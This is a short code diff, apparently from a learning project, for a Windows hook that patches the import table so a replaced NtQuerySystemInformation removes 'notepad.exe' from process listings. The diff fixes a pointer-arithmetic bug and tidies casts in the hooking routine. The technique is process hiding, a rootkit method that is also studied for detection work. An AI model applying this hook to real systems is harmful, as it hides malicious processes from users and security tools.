@@ -51,7 +51,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 		do
 		{
 			pCurrent = pNext;
-			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)(PUCHAR)pCurrent + pCurrent->NextEntryOffset;
+			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
 			if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
 			{
@@ -99,9 +99,9 @@ void StartHook() {
 	}
 
 	DWORD dwOld = NULL;
-	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
+	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
 	pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInformation;
-	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
+	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
 
 	CloseHandle(hModule);
 }
